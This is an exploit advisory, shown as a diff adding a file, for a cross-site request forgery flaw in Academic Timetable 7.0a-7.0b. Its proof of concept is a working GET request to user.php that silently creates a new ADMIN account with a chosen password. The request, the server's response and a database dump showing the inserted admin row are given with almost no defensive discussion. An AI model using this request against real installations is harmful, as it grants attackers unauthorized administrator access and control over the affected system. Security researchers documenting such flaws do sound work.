@@ -1,0 +1,39 @@
+# Exploit Title: Academic Timetable Final Build 7.0b - Cross-Site Request Forgery (Add Admin)
+# Dork: N/A
+# Date: 2018-10-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://geoffpartridge.net/
+# Software Link: https://sourceforge.net/projects/timetableacademic/files/latest/download
+# Version: 7.0a-7.0b
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Description
+# New admin can be added..
+ 
+http://192.168.1.27/[PATH]/user.php?act=insert&use_id=1testdb&use_name=1testdb&rol_id=ADMIN&password=1testdb
+
+GET [PATH]/user.php?act=insert&use_id=1testdb&use_name=1testdb&rol_id=ADMIN&password=1testdb HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Fri, 13 Oct 2018 01:10:29 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 910
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+ 
+/* `exploitdb`.`ms_user` */
+$ms_user = array(
+  array('use_id' => '1testdb','use_name' => '1testdb','rol_id' => 'ADMIN','pwd' => '*6CC4E8CFFEAF202D7475BC906612F9A29A9C8117')
+);
+#
